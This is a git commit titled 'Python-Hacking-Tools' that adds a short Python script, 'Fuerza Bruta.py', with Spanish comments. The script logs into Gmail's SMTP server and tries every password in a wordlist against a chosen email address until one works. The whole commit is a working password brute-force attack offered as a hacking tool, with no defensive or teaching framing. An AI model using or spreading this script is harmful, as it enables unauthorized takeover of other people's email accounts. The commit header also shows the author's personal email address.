a165a7bdafc36d4d4745f3c51bddb8a81e1e0000
JohanRengifo89 <johanstevenrengifo89@gmail.com>
2022-10-24 22:08:48 -0500

    Python-Hacking-Tools

---
+++ Fuerza Bruta.py
@@ -0,0 +1,16 @@
+import smtplib
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+print("\n")
+email = input("Email: ")
+#Crear Directorio o Diccionario
+#Especificar Ruta dentro de Carpeta
+dic = open("./diccionario.txt", "r")
+for pwd in dic:
+   try:
+    smtpserver.login(email, pwd)
+    print("Contraseña Correcta: %s"  % pwd)
+    break;
+   except smtplib.SMTPAuthenticationError:
+    print ("Contraseña Incorrecta: %s" % pwd)
